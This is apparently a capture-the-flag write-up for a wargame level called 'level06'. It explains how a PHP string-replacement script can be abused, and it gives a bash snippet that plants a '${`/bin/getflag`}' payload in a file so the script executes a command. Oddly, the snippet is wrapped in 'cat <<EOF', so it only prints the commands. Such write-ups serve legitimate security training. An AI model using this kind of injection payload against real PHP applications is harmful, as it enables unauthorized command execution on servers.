# Level06 Exploit

In this challenge, we have a PHP script named `level06.php` that takes two parameters and processes them to replace certain characters. Additionally, there's an executable binary, which appears to be the compiled version of the PHP script.

## Vulnerability Analysis

The PHP script reads the contents of the first parameter and performs string replacements based on predefined patterns. This presents an opportunity for exploitation, as we can manipulate the input parameter to execute arbitrary commands on the server.

## Exploit Procedure

To exploit this vulnerability and execute arbitrary commands on the server, we can craft a command that creates a file containing the command we want to execute and pass it as the first parameter to the executable. Here's the exploit script:

```bash
cat <<EOF
echo '[x \${\`/bin/getflag\`}]' > /tmp/flag06;
./level06 /tmp/flag06 2>&1 >/dev/null | awk 'NR==1 {print $NF}'
EOF
```

This script creates a file /tmp/flag06 containing the command `/bin/getflag` wrapped in `[x ${``}]`, and then passes it as the first parameter to the `level06` executable. It captures the output and extracts the flag.
